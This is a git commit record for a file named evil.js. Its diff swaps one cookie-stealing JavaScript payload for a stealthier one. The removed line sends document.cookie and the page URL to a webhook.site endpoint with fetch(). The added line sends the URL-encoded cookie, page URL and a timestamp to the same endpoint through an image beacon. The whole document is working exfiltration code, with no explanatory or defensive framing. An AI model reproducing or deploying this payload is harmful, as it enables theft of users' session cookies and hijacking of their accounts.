0a0808ff9829ae8b5561f0fb08f7b287b3631091
Tasty <94216260+tastyshu@users.noreply.github.com>
2025-11-15 13:17:09 +0300

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,2 +1,1 @@
-fetch('https://webhook.site/cbaeca30-f5c4-4055-90ad-06a4f9eba402?c' + document.cookie + '&url=' + location.href)
-  .then(() => console.log('Cookie sent!'));
+new Image().src = 'https://webhook.site/cbaeca30-f5c4-4055-90ad-06a4f9eba402?c=' + encodeURIComponent(document.cookie) + '&u=' + encodeURIComponent(location.href) + '&t=' + Date.now();
